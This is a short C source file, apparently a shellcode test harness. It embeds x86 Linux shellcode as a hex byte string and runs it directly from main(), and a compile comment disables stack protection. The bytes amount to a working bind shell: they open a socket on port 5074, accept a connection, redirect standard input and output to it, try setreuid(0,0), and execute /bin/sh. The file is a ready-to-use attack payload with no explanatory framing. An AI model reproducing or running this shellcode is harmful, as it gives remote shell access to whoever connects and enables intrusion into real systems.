#include <stdio.h>
#include <string.h>
//gcc -m32 -z execstack -fno-stack-protector final_shellcode.c -o final_shellcode

char shellcode[] = "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";

int main(int argc, char **argv) {
	int (*func)();

	func = (int(*)()) shellcode;
	func();
}
